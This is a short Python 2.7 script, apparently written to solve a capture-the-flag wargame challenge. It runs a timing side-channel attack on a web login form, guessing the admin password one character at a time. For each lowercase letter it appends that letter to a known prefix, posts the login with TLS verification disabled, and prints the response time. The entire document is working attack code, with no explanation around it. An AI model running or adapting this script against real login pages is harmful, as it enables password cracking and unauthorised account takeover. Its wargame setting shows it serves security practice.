#!/usr/bin/env python2.7

import requests
import string
import time
import sys

url = "https://zxylieipe.wargame.ndh/login"
username = "admin"

printable = string.printable[10:36]


for i in printable:
    password = "sfgzoshnkgkuxs" + i
    data = {'username':username,
            'password':password
            }
    start = time.time()
    res = requests.post(url, data=data, verify=False)
    finish = time.time()
    duration = finish - start
    print password + ':' + str(duration)
